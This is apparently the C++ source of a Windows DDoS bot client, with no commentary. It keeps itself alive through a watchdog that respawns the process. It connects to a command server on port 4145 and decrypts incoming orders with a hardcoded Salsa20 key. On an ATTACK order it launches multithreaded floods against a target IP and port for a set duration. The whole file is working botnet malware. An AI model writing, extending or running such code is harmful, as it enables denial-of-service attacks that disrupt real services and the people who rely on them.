#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include "salsa20.h"
#include "flooder.h"

#define SHARED_NAME _T("wlrntytz")
enum CommandType
{
	Attack = 1,
	Kill = 2,
};

struct Command // ATTACK <ip> <port> <duration> <thread>
{
	DWORD command_type;
	CHAR first_command[64];
	DWORD second_command;
	DWORD third_command;
	DWORD fourth_command;
};
HANDLE s_Handle;
DWORD* buffer;


SOCKET socket_;
DWORD PORT = 4145;
LPSTR SERVER_IP = "host";
uint8_t key[32] = { 34, 1,  72, 221, 123, 4, 95, 56, 62, 45, 19,
				 23, 27, 84, 24,  58,  6, 13, 62, 106, 74, 61,
				 53,  49,  58,  9, 5, 43, 11, 74, 45, 69 };
DWORD Handler();
DWORD RecvChk(Command* command);
DWORD Connect();
DWORD CommandParse(Command* command);

int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
_In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	s_Handle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(DWORD), SHARED_NAME);
	buffer = (DWORD*)MapViewOfFile(s_Handle, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(DWORD));
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		if (buffer)
		{
			UnmapViewOfFile(buffer);
		}
		if (s_Handle)
		{
			CloseHandle(s_Handle);
		}
		s_Handle = OpenFileMapping(FILE_MAP_ALL_ACCESS, NULL, SHARED_NAME);
		buffer = (DWORD*)MapViewOfFile(s_Handle, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(DWORD));
		DWORD cmd = 0;
		memcpy(&cmd, buffer, sizeof(DWORD));
		if (cmd == 1)
		{
			DWORD cng = 0;
			memcpy(buffer, &cng, sizeof(cng));
			if (buffer)
			{
				UnmapViewOfFile(buffer);
			}
			if (s_Handle)
			{
				CloseHandle(s_Handle);
			}
			Handler();
		}

		else
		{
			exit(0);
		}
	}
	else
	{
		HANDLE mutex = CreateMutex(FALSE, 0, (LPCWSTR)SERVER_IP);
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			exit(0);
		}
		CloseHandle(mutex);
		DWORD write = 1;
		memcpy(buffer, &write, sizeof(DWORD));
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		TCHAR programpath[_MAX_PATH];
		GetModuleFileName(NULL, programpath, _MAX_PATH);
		if (!CreateProcess(programpath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			return 0;
		}
		while (true)
		{
			WaitForSingleObject(pi.hProcess, INFINITE);
			DWORD exitcode = 0;
			GetExitCodeProcess(pi.hProcess, &exitcode);
			if (exitcode == 144)
			{
				exit(0);
			}
			memcpy(buffer, &write, sizeof(DWORD));
			CreateProcess(programpath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		}
	}

}

DWORD Handler()
{
	while (Connect())
	{
		Sleep(5000);
	}
	LPVOID command = malloc(sizeof(Command));
	while (true)
	{
		DWORD chk = RecvChk((Command*)command);
		if (chk == 1)
		{
			Salsa20 decrypter(key);
			decrypter.Salsa20Do(((uint8_t*)command), sizeof(Command), 78);
			CommandParse((Command*)command);
		}
		else if (chk == 0)
		{
			while (Connect())
			{
				Sleep(5000);
			}
		}
	}

}
DWORD RecvChk(Command* command)
{
	DWORD chk = recv(socket_, (char*)command, sizeof(Command), 0);
	if (chk == -1)
	{
		return 0;
	}
	else if (((char*)command)[0] == '\x00' && ((char*)command)[1] == '\x01' &&
		((char*)command)[2] == '\x00' && ((char*)command)[3] == '\x01')
	{
		return 2;
	}
	else
	{
		return 1;
		
	}

}
DWORD Connect()
{
	WSADATA wsadata_;
	WSAStartup(MAKEWORD(2, 2), &wsadata_);

	socket_ = NULL;
	socket_ = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN sockaddr_in_ = {};
	sockaddr_in_.sin_family = AF_INET;
	sockaddr_in_.sin_port = htons(PORT);

	hostent* info = gethostbyname(SERVER_IP);
	LPSTR real_info = inet_ntoa(*(struct in_addr*)info->h_addr_list[0]);

	sockaddr_in_.sin_addr.s_addr = inet_addr(real_info);

	if (connect(socket_, (SOCKADDR*)&sockaddr_in_, sizeof(sockaddr_in_)) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	return 0;
}
DWORD CommandParse(Command* command)
{
	if (command->command_type == Attack)
	{
		LPSTR ip = command->first_command;
		DWORD port = command->second_command;
		DWORD duration = command->third_command;
		DWORD thread = command->fourth_command;
		Flooder* flooder = new Flooder(ip, port, duration);
		for (DWORD i = 0; i < thread; i++)
		{
			std::thread work = flooder->WorkerThread();
			work.detach();
		}
		

	}
	else if (command->command_type == Kill)
	{
		DWORD exitcode = command->second_command;
		exit(exitcode);
	}
	return 0;
}

